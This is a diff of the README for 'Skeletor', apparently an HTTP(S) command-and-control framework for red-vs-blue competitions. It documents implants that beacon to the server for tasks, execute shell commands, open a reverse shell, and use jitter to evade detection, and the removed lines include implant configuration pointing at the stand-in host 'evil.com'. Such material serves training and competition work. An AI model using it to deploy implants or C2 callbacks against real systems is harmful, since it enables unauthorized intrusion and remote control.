@@ -1,92 +1,63 @@
 # Skeletor
+Skeletor is a HTTP(S) C2 built upon the Flask framework designed for red vs. blue cybersecurity competitions. Use only on systems which you own or are authorized to deploy on.  
+Skeletor implants communicate on a beaconing system, sending outbound POST requests to the Skeletor server's **/tasks** route at specified intervals to retrieve their tasks, execute them and send back the result
+## Quickstart
+### Setting Up Server
+Copy  the provided .env.sample file to .env and edit the values for your desired configuration (see environment variables section of README for more details)  
 
-Skeletor is a HTTP C2 built upon the Flask framework designed for red vs. blue cybersecurity competitions. Use only on systems which you own or are authorized to deploy on.
-Skeletor clients communicate on a beaconing system, sending outbound POST requests to the Skeletor server's **/tasks** route at specified intervals containing JSON data in the format:
-```json
-{
-  "agent_id": "192.168.1.9"
-}
-```  
-where agent_id is typically the local ip address of the agent, which is important for allowing us to see the local ip for identifying boxes in many red vs blue competitions. Optionally, agent_id could have 
-a different identifier, depending on how you wish to identify different agents. If there are one or more tasks assigned to them, this will retrieve the first task, which they will then handle and return the result back to the server.
-
-# Tasks
-Tasks are Skeletor's way of assigning work to clients. When a client send a POST request to the server's **/tasks** route containing their agent_id, if a task exists with a matching agent_id and a completed field with a value of False, 
-the client receives a JSON object in the form:
-```json
-{
-  "action": "command||shell",
-  "input": "command or other input",
-  "input2": "secondary input to action if required",
-  "task_id": 99
-}
+#### HTTP
+Update DB_USER and DB_PASSWORD environment variables in docker-compose.yml, then run:
 ```
-The most commonly used action for Skeletor clients is **command**, where the agents will execute the command via bash for Linux systems and Powershell for Windows systems, then return a JSON object in the
-form of 
-```json
-{
-  "agent_id": "10.1.1.9"
-  "task_id": 79
-  "result": "root"
-  "returncode": 0
-}
-```
-where task_id is assigned by the server to the task when it is created to keep track of different tasks.  
-
-## Reverse Shell
-Skeletor's **Go Implant** also has a **shell** action, which is 
-used to create a reverse shell over a WebSocket. To do so, 
-run the shell_handler.go program, either by compiling it or with
-the command *go run shell_handler.go*, which will listen for 
-incoming connections, by default on port 9000 and give you an
-interactive reverse shell to execute commands in real-time.
-
-> The shell handler is only designed to handle one connection at
-a time. Make sure you end the previous connection before 
-starting a new interactive shell. 
-
-# Usage
-## Server
-The Skeletor Console is the primary way of interacting with the Skeletor server. 
-
-Previously, the manager.py TUI and skelctl CLI could be used to manage Skeletor. However, these are now considered **legacy** and will not be updated. Additionally, skelctl will not work with the current version of Skeletor, as targeting logic has been moved from server side to client side. However, the legacy version of Skeletor can still be accessed in the **legacy** branch and will remain compatible with these management interfaces but will not receive any additional updates.
-
-### Skeletor Console
-To interact with the Skeletor server and issue commands to agents, use the Skeletor Console (*console.py*). Skeletor Console provides an interactive interface which allows you to issue commands and control Skeletor agents.
-## Implants
-To set up the implants, make any configuration changes needed in the main function of the implant program. Then, when run it will begin beaconing out to retrieve commands from the configured server. There are currently implants written in two different languages: Python and Go.
-
-### Python Implant
-
- The Python implant has three configurable arguments when creating an instance of the Beacon class: server_ip (mandatory, the IP or FQDN of the host the server is running on), port (port the server is listening on, defaults to 80), and callback_interval (the interval, in seconds, of how often the implant should beacon out. Default is 120). Additional arguments which can be defined are the jitter (defines the amount of seconds, + or -, the callback interval should be randomly adjusted each sleep to make callbacks harder to detect) and the debug and https booleans (both default to False, if https is True then https protocol will be used instead of http, and if debug is True then debugging + error messages will be printed to stdout). The following codeblock illustrates what the main function of beacon.py looks like when specifying all arguments to the implant.
-```python
-def main():
-    beacon = Beacon(server_ip="evil.com", port=80,callback_interval=120,jitter=5,debug=False,https=False)
-    beacon.run()
+docker compose up -d
 ```
 
-### Go Implant
+#### HTTPS
+- cd into the https/ directory  
+- Update DB_USER and DB_PASSWORD environment variables in docker-compose.yml  
+- Either run certgen.sh to generate self-signed certificates, or place certificates in the certs/ directory
+- Run:
+    ```
+    docker compose up -d
+    ```
 
- The Go implant's configurable arguments must be changed in the agent variable definition at the beginning of the main function. ServerIP, ServerPort, CallbackInterval, Jitter and Debug can all be changed depending on your desired configuration, while the LocalIP and Client fields of the agent struct SHOULD NOT be modified. ServerIP and ServerPort define the IP/FQDN and port the Skeletor server is listening for incoming connections on, while the CallbackInterval defines how often the implant should beacon out, while Jitter defines the amount of seconds, + or -, the callback interval should be randomly adjusted each sleep to make callbacks harder to detect. Debug is a boolean value which, when set to true, will print out debugging and error messages to stdout.
-
-```go
+### Configuring Implants
+#### Go
+Implant settings are defined in the Agent struct at the top of the main function of main.go in the implants/go directory
+```
 agent := Agent{
-        LocalIP:  getLocalIP(),
-        ServerIP: "evil.com",
-        ServerPort: 80,
+		LocalIP:          getLocalIP(),
+		ServerIP:         "127.0.0.1",
+		ServerPort:       443,
 		CallbackInterval: 15,
-		Jitter: 5,
-		Debug: true,
+		Jitter:           5,
+		Debug:            false,
 		Client: &http.Client{
-            Timeout: 10 * time.Second,
-        },
-    }
+			Timeout: 10 * time.Second,
+		},
+		Https: true,
+	}
 ```
+Configurable settings:
+- ServerIP - set to value of server's IP address / domain name
+- ServerPort - port the server is listening on
+- CallbackInterval - time in seconds between callbacks to Skeletor C2 server
+- Jitter - callback intervals will be randomized if greater than 0 and occur between (CallbackInterval - Jitter) and (CallbackInterval + Jitter) seconds
+- Debug - Should be set to false usually, output error messages if set to true
+- Https - boolean for whether to use HTTPS instead of unencrypted HTTP  
 
-### Implant Feature Comparison
+After setting desired configuration, compile using Makefile or *go build*
+#### Python
 
-| Feature | Go Implant | Python Implant|
-| :--- | :---: | :---: |
-| **Command Execution** | &check; | &check; |
-| **HTTPS Support** | &check;| &check; |
-|**Websocket-based Reverse Shell**|&check;|&cross;|
+```
+    beacon = Beacon("127.0.0.1",port=443,callback_interval=15,jitter=7,https=True)
+```
+Configurable paramaters:
+- server_ip - Required paramater, set to server IP address / domain name
+- port - defaults to port 80, set to port server is listening on
+- callback_interval - defaults to 120, seconds between callbacks
+- jitter - defaults to 5, actual callback interval = randomied amount of seconds between (callback_interval - jitter) and (callback_interval + jitter)
+- debug - defaults to false, if true prints debugging messages
+- https - defaults to false, specififies whether to use https instead of unencrypted http
+
+The *requests* library is required on the host the implant is run on to send the outbound HTTP(S) requests
+
